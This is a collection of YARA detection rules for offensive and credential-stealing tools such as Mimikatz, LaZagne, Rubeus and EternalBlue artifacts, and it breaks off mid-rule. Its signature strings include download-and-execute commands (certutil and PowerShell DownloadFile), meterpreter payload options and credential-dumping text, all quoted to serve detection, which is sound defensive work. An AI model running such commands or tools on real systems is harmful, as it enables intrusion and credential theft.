rule INDICATOR_TOOL_PWS_LaZagne {
    meta:
        description = "Detects LaZagne post-exploitation password stealing tool. It is typically embedded with malware in the binary resources."
        author = "ditekSHen"
    strings:
        $s1 = "blaZagne.exe.manifest" fullword ascii
        $S2 = "opyi-windows-manifest-filename laZagne.exe.manifest" fullword ascii
        $s3 = "lazagne.softwares.windows." ascii
        $s4 = "lazagne.softwares.sysadmin." ascii
        $s5 = "lazagne.softwares.php." ascii
        $s6 = "lazagne.softwares.memory." ascii
        $s7 = "lazagne.softwares.databases." ascii
        $s8 = "lazagne.softwares.browsers." ascii
        $s9 = "lazagne.config.write_output(" fullword ascii
        $s10 = "lazagne.config." ascii
    condition:
       uint16(0) == 0x5a4d and any of them
}

rule INDICATOR_TOOL_PWS_Credstealer {
    meta:
        description = "Detects Python executable for stealing credentials including domain environments. Observed in MuddyWater."
        author = "ditekSHen"
    strings:
        $s1 = "PYTHON27.DLL" fullword wide
        $s2 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyR" fullword ascii
        $s3 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyt" fullword ascii
        $s4 = "subprocess.pyc" fullword ascii
        $s5 = "MyGetProcAddress(%p, %p(%s)) -> %p" fullword ascii
        $p1 = "Dump SAM hashes from target systemss" fullword ascii
        $p2 = "Dump LSA secrets from target systemss" fullword ascii
        $p3 = "Dump the NTDS.dit from target DCs using the specifed method" fullword ascii
        $p4 = "Dump NTDS.dit password historys" fullword ascii
        $p5 = "Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameterss" fullword ascii
        $p6 = "Retrieve plaintext passwords and other information for accounts pushed through Group Policy Preferencess" fullword ascii
        $p7 = "Combo file containing a list of domain\\username:password or username:password entriess" fullword ascii
    condition:
       uint16(0) == 0x5a4d and (3 of ($s*) and 1 of ($p*))
}

rule INDICATOR_TOOL_CNC_Shootback {
    meta:
        description = "detects Python executable for CnC communication via reverse tunnels. Used by MuddyWater group."
        author = "ditekSHen"
    strings:
        $s1 = "PYTHON27.DLL" fullword wide
        $s2 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyR" fullword ascii
        $s3 = "C:\\Python27\\lib\\site-packages\\py2exe\\boot_common.pyt" fullword ascii
        $s4 = "subprocess.pyc" fullword ascii
        $s5 = "MyGetProcAddress(%p, %p(%s)) -> %p" fullword ascii
        $p1 = "Slaver(this pc):" ascii
        $p2 = "Master(another public server):" ascii
        $p3 = "Master(this pc):" ascii
        $p4 = "running as slaver, master addr: {} target: {}R/" fullword ascii
        $p5 = "Customer(this pc): " ascii
        $p6 = "Customer(any internet user):" ascii
        $p7 = "the actual traffic is:  customer <--> master(1.2.3.4) <--> slaver(this pc) <--> ssh(this pc)" fullword ascii
    condition:
       uint16(0) == 0x5a4d and (3 of ($s*) and 2 of ($p*))
}

rule INDICATOR_TOOL_PWS_Fgdump {
    meta:
        description = "detects all versions of the password dumping tool, fgdump. Observed to be used by DustSquad group."
        author = "ditekSHen"
    strings:
        $s1 = "dumping server %s" ascii
        $s2 = "dump on server %s" ascii
        $s3 = "dump passwords: %s" ascii
        $s4 = "Dumping cache" nocase ascii
        $s5 = "SECURITY\\Cache" ascii
        $s6 = "LSASS.EXE process" ascii
        $s7 = " AntiVirus " nocase ascii
        $s8 = " IPC$ " ascii
        $s9 = "Exec failed, GetLastError returned %d" fullword ascii
        $10 = "writable connection to %s" ascii
    condition:
        uint16(0) == 0x5a4d and 5 of them
}

rule INDICATOR_TOOL_PWS_SharpWeb {
    meta:
        description = "detects all versions of the browser password dumping .NET tool, SharpWeb."
        author = "ditekSHen"
    strings:
        $param1 = "logins" nocase wide
        $param2 = "cookies" nocase wide
        $param3 = "edge" nocase wide
        $param4 = "firefox" nocase wide
        $param5 = "chrome" nocase wide

        $path1 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" wide
        $path2 = "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\" wide
        $path3 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies" wide
        $path4 = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks" wide

        $sql1 = "UPDATE sqlite_temp_master SET sql = sqlite_rename_trigger(sql, %Q), tbl_name = %Q WHERE %s;" nocase wide
        $sql2 = "UPDATE %Q.%s SET type='%s', name=%Q, tbl_name=%Q, rootpage=#%d, sql=%Q WHERE rowid=#%d" nocase wide
        $sql3 = "SELECT action_url, username_value, password_value FROM logins" nocase wide

        $func1 = "get_encryptedPassword" fullword ascii
        $func2 = "<GetLogins>g__GetVaultElementValue0_0" fullword ascii
        $func3 = "<encryptedPassword>k__BackingField" fullword ascii

        $pdb = "\\SharpWeb\\obj\\Debug\\SharpWeb.pdb" fullword ascii
    condition:
        uint16(0) == 0x5a4d and ((1 of ($func*) and 3 of ($param*) and (1 of ($path*) or 1 of ($sql*))) or $pdb)
}

rule INDICATOR_TOOL_PWS_Blackbone {
    meta:
        description = "detects Blackbone password dumping tool on Windows 7-10 operating system."
        author = "ditekSHen"
    strings:
        $s1 = "BlackBone: %s: " ascii
        $s2 = "\\BlackBoneDrv\\" ascii
        $s3 = "\\DosDevices\\BlackBone" fullword wide
        $s4 = "\\Temp\\BBImage.manifest" wide
        $s5 = "\\Device\\BlackBone" fullword wide
        $s6 = "BBExecuteInNewThread" fullword ascii
        $s7 = "BBHideVAD" fullword ascii
        $s8 = "BBInjectDll" fullword ascii
        $s9 = "ntoskrnl.exe" fullword ascii
        $s10 = "WDKTestCert Ton," ascii
    condition:
        uint16(0) == 0x5a4d and 5 of them
}

rule INDICATOR_TOOL_PWS_Mimikatz {
    meta:
        description = "Detects Mimikatz."
        author = "ditekSHen"
    strings:
        $s1 = "mimilib.dll" ascii
        $s2 = "mimidrv.sys" ascii
        $s3 = "mimikatz.exe" ascii
        $s4 = "\\mimidrv.pdb" ascii
        $s5 = "mimikatz" ascii
        $s6 = { 6d 00 69 00 6d 00 69 00 6b 00 61 00 74 00 7a }  // m|00|i|00|m|00|i|00|k|00|a|00|t|00|z
        $s7 = { 5c 00 6d 00 69 00 6d 00 69 00 64 00 72 00 76 }  // \|00|m|00|i|00|m|00i|00|d|00|r|00|v
        $s8 = { 6d 00 69 00 6d 00 69 00 64 00 72 00 76 }        // m|00|i|00|m|00i|00|d|00|r|00|v
        $s9 = "Lecture KIWI_MSV1_0_" ascii
        $s10 = "Search for LSASS process" ascii

        $f1 = "SspCredentialList" ascii
        $f2 = "KerbGlobalLogonSessionTable" ascii
        $f3 = "LiveGlobalLogonSessionList" ascii
        $f4 = "TSGlobalCredTable" ascii
        $f5 = "g_MasterKeyCacheList" ascii
        $f6 = "l_LogSessList" ascii
        $f7 = "lsasrv!" ascii
        $f8 = "SekurLSA" ascii
        $f9 = /Cached(Unlock|Interative|RemoteInteractive)/ ascii

        // https://github.com/gentilkiwi/mimikatz/blob/master/kiwi_passwords.yar
        $dll_1 = { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2 = { c7 0? 10 02 00 00 ?? 89 4? }
        $sys_x86 = { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64 = { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }
    condition:
        uint16(0) == 0x5a4d and (2 of ($*) or 3 of ($f*) or all of ($dll_*) or any of ($sys_*))
}

rule INDICATOR_TOOL_SCN_PortScan {
    meta:
        description = "Detects a port scanner tool observed as second or third stage post-compromise or dropped by malware."
        author = "ditekSHen"
    strings:
        $s1 = "HEAD / HTTP/1.0" fullword ascii
        $s2 = "Result.txt" fullword ascii
        $s3 = "Example: %s SYN " ascii
        $s4 = "Performing Time: %d/%d/%d %d:%d:%d -->" fullword ascii
        $s5 = "Bind On IP: %d.%d.%d.%d" fullword ascii
        $s6 = "SYN Scan: About To Scan %" ascii
        $s7 = "Normal Scan: About To Scan %" ascii
    condition:
        uint16(0) == 0x5a4d and 5 of them
}

rule INDICATOR_TOOL_MEM_mXtract {
    meta:
        description = "Detects mXtract, a linux-based tool that dumps memory for offensive pentration testing and can be used to scan memory for private keys, ips, and passwords using regexes."
        author = "ditekSHen"
    strings:
        $s1 = "_ZN18process_operations10get_rangesEv" fullword ascii
        $s2 = "_ZN4misc10write_dumpESsSs" fullword ascii
        $s3 = "_ZTVNSt8__detail13_Scanner_baseE" fullword ascii
        $s4 = "Running as root is recommended as not all PIDs will be scanned" fullword ascii
        $s5 = "ERROR ATTACHING TO PROCESS" fullword ascii
        $s6 = "ERROR SCANNING MEMORY RANGE" fullword ascii
    condition:
        (uint32(0) == 0x464c457f or uint16(0) == 0x457f) and 3 of them
}

rule INDICATOR_TOOL_PWS_SniffPass {
    meta:
        description = "Detects SniffPass, a password monitoring software that listens on the network and captures passwords over POP3, IMAP4, SMTP, FTP, and HTTP."
        author = "ditekSHen"
    strings:
        $s1 = "\\Release\\SniffPass.pdb" ascii
        $s2 = "Password   Sniffer" fullword wide
        $s3 = "Software\\NirSoft\\SniffPass" fullword ascii
        $s4 = "Sniffed PasswordsCFailed to start" wide
        $s5 = "Pwpcap.dll" fullword ascii
        $s6 = "nmwifi.exe" fullword ascii
        $s7 = "NmApi.dll" fullword ascii
        $s8 = "npptools.dll" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 4 of them
}

rule INDICATOR_TOOL_AVBypass_AVIator {
    meta:
        description = "Detects AVIator, which is a backdoor generator utility, which uses cryptographic and injection techniques in order to bypass AV detection. This was observed to bypass Win.Trojan.AZorult. This rule works for binaries and memory."
        author = "ditekSHen"
    strings:
        $s1 = "msfvenom -p windows/meterpreter" ascii wide
        $s2 = "payloadBox.Text" ascii wide
        $s3 = "APCInjectionCheckBox" ascii wide
        $s4 = "Thread Hijacking (Shellcode Arch: x86, OS Arch: x86)" ascii wide
        $s5 = "injectExistingApp.Text" ascii wide
        $s6 = "Stable execution but can be traced by most AVs" ascii wide
        $s7 = "AV/\\tor" ascii wide
        $s8 = "AvIator.Properties.Resources" ascii wide
        $s9 = "Select injection technique" ascii wide
        $s10 = "threadHijacking_option" ascii wide

        $pwsh1 = "Convert.ToByte(Payload_Encrypted_Without_delimiterChar[" ascii wide
        $pwsh2 = "[DllImport(\"kernel32.dll\", SetLastError = true)]" ascii wide
        $pwsh3 = "IntPtr RtlAdjustPrivilege(" ascii wide
        $pwsh4 = /InjectShellcode\.(THREADENTRY32|CONTEXT64|WriteProcessMemory\(|CloseHandle\(|CONTEXT_FLAGS|CONTEXT\(\);|Thread32Next\()/ ascii wide
        $pwsh5 = "= Payload_Encrypted.Split(',');" ascii wide
        $pwsh6 = "namespace NativePayload_Reverse_tcp" ascii wide
        $pwsh7 = "byte[] Finall_Payload = Decrypt(KEY, _X_to_Bytes);" ascii wide
        $pwsh8 = /ConstantsAndExtCalls\.(WriteProcessMemory\(|CreateRemoteThread\()/ ascii wide
    condition:
        (uint16(0) == 0x5a4d and (3 of ($s*) or 2 of ($pwsh*))) or (3 of ($s*) or 2 of ($pwsh*))
}

rule INDICATOR_TOOL_PWS_PwDump7 {
    meta:
        description = "Detects Pwdump7 password Dumper"
        author = "ditekSHen"
    strings:
        $s1 = "savedump.dat" fullword ascii
        $s2 = "Asd -_- _RegEnumKey fail!" fullword ascii
        $s3 = "\\SAM\\" ascii
        $s4 = "Unable to dump file %S" fullword ascii
        $s5 = "NO PASSWORD" ascii
    condition:
        (uint16(0) == 0x5a4d and 4 of them) or (all of them)
}

rule INDICATOR_TOOL_LTM_SharpExec {
    meta:
        description = "Detects SharpExec lateral movement tool"
        author = "ditekSHen"
    strings:
        $s1 = "fileUploaded" fullword ascii
        $s2 = "$7fbad126-e21c-4c4e-a9f0-613fcf585a71" fullword ascii
        $s3 = "DESKTOP_HOOKCONTROL" fullword ascii
        $s4 = /WINSTA_(ACCESSCLIPBOARD|WINSTA_ALL_ACCESS)/ fullword ascii
        $s5 = /NETBIND(ADD|DISABLE|ENABLE|REMOVE)/ fullword ascii
        $s6 = /SERVICE_(ALL_ACCESS|WIN32_OWN_PROCESS|INTERROGATE)/ fullword ascii
        $s7 = /(Sharp|PS|smb)Exec/ fullword ascii
        $s8 = "lpszPassword" fullword ascii
        $s9 = "lpszDomain" fullword ascii
        $s10 = "wmiexec" fullword ascii
        $s11 = "\\C$\\__LegitFile" wide
        $s12 = "LOGON32_LOGON_NEW_CREDENTIALS" fullword ascii
    condition:
        (uint16(0) == 0x5a4d and 9 of them) or (all of them)
}

rule INDICATOR_TOOL_PRV_AdvancedRun {
    meta:
        description = "Detects NirSoft AdvancedRun privialge escalation tool"
        author = "ditekSHen"
    strings:
        $s1 = "RunAsProcessName" fullword wide
        $s2 = "Process ID/Name:" fullword wide
        $s3 = "swinsta.dll" fullword wide
        $s4 = "User of the selected process0Child of selected process (Using code injection) Specified user name and password" fullword wide
        $s5 = "\"Current User - Allow UAC Elevation$Current User - Without UAC Elevation#Administrator (Force UAC Elevation)" fullword wide
    condition:
        uint16(0) == 0x5a4d and 3 of them
}

rule INDICATOR_TOOL_PWS_Amady {
    meta:
        description = "Detects password stealer DLL. Dropped by Amady"
        author = "ditekSHen"
    strings:
        $s1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\AppData" fullword ascii
        $s2 = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook" ascii
        $s3 = "\\Mikrotik\\Winbox\\Addresses.cdb" fullword ascii
        $s4 = "\\HostName" fullword ascii
        $s5 = "\\Password" fullword ascii
        $s6 = "SOFTWARE\\RealVNC\\" ascii
        $s7 = "SOFTWARE\\TightVNC\\" ascii
        $s8 = "cred.dll" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 400KB and 7 of them
}

rule INDICATOR_TOOL_SCR_Amady {
    meta:
        description = "Detects screenshot stealer DLL. Dropped by Amady"
        author = "ditekSHen"
    strings:
        $s1 = "User-Agent: Uploador" fullword ascii
        $s2 = "Content-Disposition: form-data; name=\"data\"; filename=\"" fullword ascii
        $s3 = "WebUpload" fullword ascii
        $s4 = "Cannot assign a %s to a %s%List does not allow duplicates ($0%x)%String" wide
        $s5 = "scr.dll" fullword ascii
    condition:
        uint16(0) == 0x5a4d and filesize < 700KB and 4 of them
}

rule INDICATOR_TOOL_EXP_EternalBlue {
    meta:
        description = "Detects Windows executables containing EternalBlue explitation artifacts"
        author = "ditekSHen"
    strings:
        $ci1 = "CNEFileIO_" ascii wide
        $ci2 = "coli_" ascii wide
        $ci3 = "mainWrapper" ascii wide

        $dp1 = "EXPLOIT_SHELLCODE" ascii wide
        $dp2 = "ETERNALBLUE_VALIDATE_BACKDOOR" ascii wide
        $dp3 = "ETERNALBLUE_DOUBLEPULSAR_PRESENT" ascii wide
        $dp4 = "//service[name='smb']/port" ascii wide
        $dp5 = /DOUBLEPULSAR_(PROTOCOL_|ARCHITECTURE_|FUNCTION_|DLL_|PROCESS_|COMMAND_|IS_64_BIT)/

        $cm1 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x64 --Function Rundll" ascii wide
        $cm2 = "--DllOrdinal 1 ProcessName lsass.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll" ascii wide
        $cm3 = "--DaveProxyPort=0 --NetworkTimeout 30 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig" ascii wide
    condition:
        uint16(0) == 0x5a4d and (2 of ($ci*)) or (2 of ($dp*)) or (1 of ($dp*) and 1 of ($ci*)) or (1 of ($cm*))
}

rule INDICATOR_TOOL_EXP_WebLogic {
    meta:
        description = "Detects Windows executables containing Weblogic exploits commands"
        author = "ditekSHen"
    strings:
        $s1 = "certutil.exe -urlcache -split -f AAAAA BBBBB & cmd.exe /c BBBBB" ascii
        $s2 = "powershell (new-object System.Net.WebClient).DownloadFile('AAAAA','BBBBB')" ascii
    condition:
        uint16(0) == 0x5a4d and 1 of them
}

rule INDICATOR_TOOL_EXP_ApacheStrusts {
    meta:
        description = "Detects Windows executables containing ApacheStruts exploit artifatcs"
        author = "ditekSHen"
    strings:
        // CVE-2017-5638
        $x1 = "apache.struts2.ServletActionContext@getResponse" ascii
        $e1 = ".getWriter()" ascii
        $e2 = ".getOutputStream()" ascii
        $e3 = ".getInputStream()" ascii

        // CVE-2018-11776
        $x2 = "#_memberAccess" ascii
        $s1 = "ognl.OgnlContext" ascii
        $s2 = "ognl.ClassResolver" ascii
        $s3 = "ognl.TypeConverter" ascii
        $s4 = "ognl.MemberAccess" ascii
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f) and ($x1 and 2 of ($e*)) or ($x2 and 1 of ($s*))
}

rule INDICATOR_TOOL_SCN_SMBTouch {
    meta:
        description = "Detects SMBTouch scanner EternalBlue, EternalChampion, EternalRomance, EternalSynergy"
        author = "ditekSHen"
    strings:
        $s1 = "[+] SMB Touch started" fullword ascii
        $s2 = "[-] Could not connect to share (0x%08X - %s)" fullword ascii
        $s3 = "[!] Target could be either SP%d or SP%d," fullword ascii
        $s4 = "[!] for these SMB exploits they are equivalent" fullword ascii
        $s5 = "[+] Target is vulnerable to %d exploit%s" fullword ascii
        $s6 = "[+] Touch completed successfully" fullword ascii
        $s7 = "Network error while determining exploitability" fullword ascii
        $s8 = "Named pipe or share required for exploit" fullword ascii
        $w1 = "UsingNbt" fullword ascii
        $w2 = "TargetPort" fullword ascii
        $w3 = "TargetIp" fullword ascii
        $w4 = "RedirectedTargetPort" fullword ascii
        $w5 = "RedirectedTargetIp" fullword ascii
        $w6 = "NtlmHash" fullword ascii
        $w7 = "\\PIPE\\LANMAN" fullword ascii
        $w8 = "UserRejected: " fullword ascii
    condition:
        uint16(0) == 0x5a4d and (2 of ($s*) or all of ($w*))
}

rule INDICATOR_TOOL_SCN_NBTScan {
    meta:
        description = "Detects NBTScan scanner for open NETBIOS nameservers on a local or remote TCP/IP network"
        author = "ditekSHen"
    strings:
        $s1 = "[%s] is an invalid target (bad IP/hostname)" fullword ascii
        $s2 = "ERROR: no parse for %s -- %s" fullword ascii
        $s3 = "add_target failed" fullword ascii
        $s4 = "   -p <n>    bind to UDP Port <n> (default=%d)" fullword ascii
        $s5 = "process_response.c" fullword ascii
        $s6 = "currTarget != 0" fullword ascii
        $s7 = "parse_target.c" fullword ascii
        $s8 = "dump_packet.c" fullword ascii
        $s9 = "parse_target_cb.c" fullword ascii
        $s10 = "DUMP OF PACKET" fullword ascii
        $s11 = "lookup_hostname.c" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 10 of ($s*)
}

rule INDICATOR_TOOL_LTM_CompiledImpacket {
    meta:
        description = "Detects executables of compiled Impacket's python scripts"
        author = "ditekSHen"
    strings:
        $s1 = "impacket(" fullword ascii
        $s2 = "impacket.dcerpc(" fullword ascii
        $s3 = "impacket.krb5(" fullword ascii
        $s4 = "impacket.smb(" fullword ascii
        $s5 = "impacket.smb3(" fullword ascii
        $s6 = "impacket.winregistry(" fullword ascii
        $s7 = "impacket.ntlm(" fullword ascii
        $m1 = "inspect(" fullword ascii
        $m2 = "pickle(" fullword ascii
        $m3 = "spsexec" fullword ascii
        $m4 = "schecker" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (2 of ($s*) or (3 of ($m*) and 1 of ($s*)))
}

rule INDICATOR_TOOL_ENC_BestCrypt {
    meta:
        description = "Detects BestEncrypt commercial disk encryption and wiping software"
        author = "ditekSHen"
    strings:
        $s1 = "BestCrypt Volume Encryption" wide
        $s2 = "BCWipe for " wide
        $s3 = "Software\\Jetico\\BestCrypt" wide
        $s4 = "%c:\\EFI\\Jetico\\" fullword wide
    condition:
        uint16(0) == 0x5a4d and all of them
}

rule INDICATOR_TOOL_CNC_Earthworm {
    meta:
        description = "Detects Earthworm C&C Windows/macOS tool"
        author = "ditekSHen"
    strings:
        $s1 = "lcx_tran 0.0.0.0:%d <--[%4d usec]--> %s:%d" fullword ascii
        $s2 = "ssocksd 0.0.0.0:%d <--[%4d usec]--> socks server" fullword ascii
        $s3 = "rcsocks 0.0.0.0:%d <--[%4d usec]--> 0.0.0.0:%d" fullword ascii
        $s4 = "rssocks %s:%d <--[%4d usec]--> socks server" fullword ascii
        $s5 = "--> %3d <-- (close)used/unused  %d/%d" fullword ascii
        $s6 = "<-- %3d --> (open)used/unused  %d/%d" fullword ascii
        $s7 = "--> %d start server" ascii
        $s8 = "Error on connect %s:%d [proto_init_cmd_rcsocket]" fullword ascii
        $url = "http://rootkiter.com/EarthWrom/" nocase fullword ascii
    condition:
        (uint16(0) == 0xfacf or uint16(0) == 0x5a4d) and (5 of ($s*) or $url)
}

rule INDICATOR_TOOL_PET_p0wnedShell {
    meta:
        description = "Detects compiled executables of p0wnedShell post-exploitation toolkit"
        author = "ditekSHen"
    strings:
        $s1 = "Use WinRM, PsExec, SMB/WMI to execute commands on remote systems" wide
        $s2 = "-CreateProcess \"cmd.exe\" -Username \"nt authority\\system\"" wide
        $s3 = "-Command '\"lsadump::dcsync /user:" wide
        $s4 = "-Payload windows/meterpreter/reverse_https -Lhost" wide
        $s5 = "Get-Content ./EncodedPayload.bat" fullword wide
        $e1 = "OnYNAB+LCAAAAAAABAC8vOeS60iSLvh75yly+rZZVxuqC4KQs3uvLQhFEJIACALoHVuD1oKQBMbuuy+Y4pw8dUTf3R+bZlWVZHh87uHh4vPItv63ZGrCMW+bF7GZ2zL+" wide
        $e2 = "kuIeAB+LCAAAAAAABADsvWt327iuMPw9v0Jv27Wa7DqJc2ma5nl71vZFTpzx/ZJL+3TlyLZiq7EtjyTHcffZ//0BSEqiKEqWbKczs8941qS2LgAIAiAIguDjfNp3DHOq" wide
        $e3 = "mZYIAB+LCAAAAAAABADsvflj2zyOMPx7/gptmnftbBIfuZp0t/OOfMZp7PjO0adfX9lSbCWy5Vp2HGfm+d8/ACQl6vCRNp2Z3bVmnioWSRAEQQAESfC/Pmwp8FTtmTFu" wide
        $e4 = "u9YGAB+LCAAAAAAABADsvW1D40ayKPw9v0Lr4V7ZE8vY5mUY9rKJBzMTnmWAgyGTvYTlCluAdmzJK9nDsEn++1NV/S61ZJmXZJIN52wG7O7q6urq6qrqquoXSfDveZgE" wide
        $e5 = "T3gDAB+LCAAAAAAABADtvX1f2zq2KPz3yafQzuZcwi5JEydQ2nM7v4cCnc0zQLmE7j3z6+7NmMQBnwY7YzsFTqff/WpJsi3Jki07DlA2mT008ctaS0tL601L0nThjSPX" wide
        $e6 = "zRgDAB+LCAAAAAAABADtfW1327jR6OdHv4Kr9TmWdiVZkl+SdZs913Gcrm9tx7WcbvekuS4t0TYbiVRJKYmfbf77xeCNeCVBinKcbNStI5HAYDAYDAaDwczNMhovwjjy" wide
        $e7 = "pxICAB+LCAAAAAAABADtvf17GkeyKPyz+Cvmlfw+ggRhfcXr1X1znsUIx5yVhC7IUbI+fnUHGKRZwww7M1jWyeZ/v1XV3z09wABysnviZ1cBpqe6urqquqq6uno8j4ZZ" wide
        $e8 = "H4sIAAAAAAAEANy9e3wTVfo4PG1SmkLbCdpgFdSgUeuCbLTAthYk005gQhNahUIVkCqIqKi1TaAuIGBaJRzG27Kuul5wV3fV1fUuUFxNKbTl3oJAuaiouE4paAGBFpB5" wide
        $k1 = "EasySystemPPID" fullword ascii
        $k2 = "EasySystemShell" fullword ascii
        $k3 = "LatMovement" fullword ascii
        $k4 = "ListenerURL" fullword ascii
        $k5 = "MeterStager" fullword ascii
        $k6 = "PatchEventLog" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (3 of ($s*) or 7 of ($e*) or all of ($k*) or (2 of ($s*) and 2 of ($e*) and 2 of ($k*)))
}

rule INDICATOR_TOOL_PWS_Rubeus {
    meta:
        description = "Detects Rubeus kerberos defensive/offensive toolset"
        author = "ditekSHen"
    strings:
        $s1 = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" fullword wide
        $s2 = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))" fullword wide
        $s3 = "rc4opsec" fullword wide
        $s4 = "pwdlastset" fullword wide
        $s5 = "LsaEnumerateLogonSessions" fullword ascii
        $s6 = "extractKerberoastHash" fullword ascii
        $s7 = "ComputeAllKerberosPasswordHashes" fullword ascii
        $s8 = "kerberoastDomain" fullword ascii
        $s9 = "GetUsernamePasswordTGT" fullword ascii
        $s10 = "WriteUserPasswordToFile" fullword ascii
    condition:
        uint16(0) == 0x5a4d and 8 of them
}

rule INDICATOR_TOOL_RTK_HiddenRootKit {
    meta:
        author = "ditekSHen"
        description = "Detects the Hidden public rootkit"
    strings:
        $h1 = "Hid_State" fullword wide
        $h2 = "Hid_StealthMode" fullword wide
        $h3 = "Hid_HideFsDirs" fullword wide
        $h4 = "Hid_HideFsFiles" fullword wide
        $h5 = "Hid_HideRegKeys" fullword wide
        $h6 = "Hid_HideRegValues" fullword wide
        $h7 = "Hid_IgnoredImages" fullword wide
        $h8 = "Hid_ProtectedImages" fullword wide
        $s1 = "FLTMGR.SYS" fullword ascii
        $s2 = "HAL.dll" fullword ascii
        $s3 = "\\SystemRoot\\System32\\csrss.exe" fullword wide
        $s4 = "\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\%wZ" fullword wide
        $s5 = "INIT" fullword ascii
        $s6 = "\\hidden-master\\Debug\\QAssist.pdb" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (3 of ($h*) or 5 of ($s*) or (2 of ($s*) and 2 of ($h*)))
}

rule INDICATOR_TOOL_PET_SharpHound {
    meta:
        author = "ditekSHen"
        description = "Detects BloodHound"
    strings:
        $id1 = "InvokeBloodHound" fullword ascii
        $id2 = "Sharphound" ascii nocase
        $s1 = "SamServerExecute" fullword ascii
        $s2 = "get_RemoteDesktopUsers" fullword ascii
        $s3 = "commandline.dll.compressed" ascii wide
        $s4 = "operatingsystemservicepack" fullword wide
        $s5 = "LDAP://" fullword wide
        $s6 = "wkui1_logon_domain" fullword ascii
        $s7 = "GpoProps" fullword ascii
        $s8 = "a517a8de-5834-411d-abda-2d0e1766539c" fullword ascii nocase
    condition:
        uint16(0) == 0x5a4d and (all of ($id*) or 6 of ($s*) or (1 of ($id*) and 4 of ($s*)))
}

rule INDICATOR_TOOL_UAC_NSISUAC {
    meta:
        author = "ditekSHen"
        description = "Detects NSIS UAC plugin"
    strings:
        $s1 = "HideCurrUserOpt" fullword wide
        $s2 = "/UAC:%X /NCRC%s" fullword wide
        $s3 = "2MyRunAsStrings" fullword wide
        $s4 = "CheckElevationEnabled" fullword ascii
        $s5 = "UAC.dll" fullword ascii
    condition:
        uint16(0) == 0x5a4d and all of them
}

rule INDICATOR_TOOL_REM_IntelliAdmin {
    meta:
        author = "ditekSHen"
        description = "Detects commerical IntelliAdmin remote tool"
    strings:
        $pdb1 = "\\Network Administrator" ascii
        $pdb2 = "\\Binaries\\Plugins\\Tools\\RPCService.pdb" ascii
        $s1 = "CIntelliAdminRPC" fullword wide
        $s2 = "IntelliAdmin RPC Service" fullword wide
        $s3 = "IntelliAdmin Remote Execute v" ascii
        $s4 = "IntelliAdminRPC" fullword ascii
    condition:
        uint16(0) == 0x5a4d and (all of ($pdb*) or 2 of ($s*))
}

rule INDICATOR_TOOL_PET_SharpWMI {
    meta:
        author = "ditekSHen"
        description = "Detects SharpWMI"
    strings:
        $s1 = "scriptKillTimeout" fullword ascii
        $s2 = "RemoteWMIExecuteWithOutput" fullword ascii
        $s3 = "RemoteWMIFirewall" fullword ascii
        $s4 = "iex([char[]](@({0})|%{{$_-bxor{1}}}) -join '')" fullword wide
        $s5 = "\\\\{0}\\root\\subscription" fullword wide
        $s6 = "_Context##RANDOM##" fullword wide
        $s7 = "executevbs" fullword wide
        $s8 = "scriptb64" fullword wide
    condition:
        uint16(0) == 0x5a4d and 4 of them
}

rule INDICATOR_TOOL_PET_DefenderControl {
    meta:
        author = "ditekSHen"
        description = "Detects Defender Control"
    strings:
        $s1 = "Windows Defender Control" wide
        $s2 = "www.sordum.org" wide ascii
        $s3 = "AutoIt" wide
    condition:
        uint16(0) == 0x5a4d and all of them
}

rule INDICATOR_TOOL_PET_Mulit_VenomAgent {
    meta:
        author = "ditekSHen"
        description = "Detects Venom Proxy Agent"
    strings:
        $s1 = "github.com/Dliv3/Venom/" ascii
        $s2 = "3HpKQVB3nT3qaNQPT-ZU/SKJ55ofz5TEmg5O3ROWA/CUs_-gfa04tGVO633Z4G/OSeEpRRb0Sq_5R6ArIi-" ascii
        $s3 = "venom_agent -" ascii
        $s4 = "bufferssh-userauthtransmitfileunknown portwirep: p->m= != sweepgen" ascii
        $s5 = "golang.org/x/crypto/ssh.(*handshakeTransport).readPacket"
    condition:
        (uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf) and 3 of them
}

rule INDICATOR_TOOL_HFS_WebServer {
    meta:
        author = "ditekSHen"
        description = "Detects HFS Web Server"
    strings:
        $s1 = "SOFTWARE\\Borland\\Delphi\\" ascii
        $s2 = "C:\\code\\mine\\hfs\\scriptLib.pas" fullword ascii
        $s3 = "hfs.*;*.htm*;descript.ion;*.comment;*.md5;*.corrupted;*.lnk" ascii
        $s4 = "Server: HFS" ascii
    condition:
        uint16(0) == 0x5a4d and all of them
}

rule INDICATOR_TOOL_PROX_lanproxy {
    meta:
        author = "ditekSHen"
        description = "Detects lanproxy-go-client"
    strings:
        $s1 = "serverShare" fullword ascii
        $s2 = "parkingOnChan" fullword ascii
